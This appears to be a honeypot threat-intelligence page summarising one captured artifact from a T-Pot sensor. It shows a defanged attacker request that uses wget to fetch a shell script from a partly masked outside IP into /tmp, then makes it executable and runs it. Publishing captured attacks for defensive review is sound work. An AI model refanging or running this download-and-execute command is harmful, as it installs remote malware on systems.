# 6c257f8d0fe64b1f7c97947773e2b89167f69c009bae6ef4307a8b4d8d87879c

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `6c257f8d0fe64b1f7c97947773e2b89167f69c009bae6ef4307a8b4d8d87879c` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /shell?wget hxxp://94[.]154[.]43[.]XXX:8080/ohshit.sh -O /tmp/ohshit.sh; chmod 777 /tmp/ohshit.sh; sh /tmp/ohshit.sh HTTP/
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
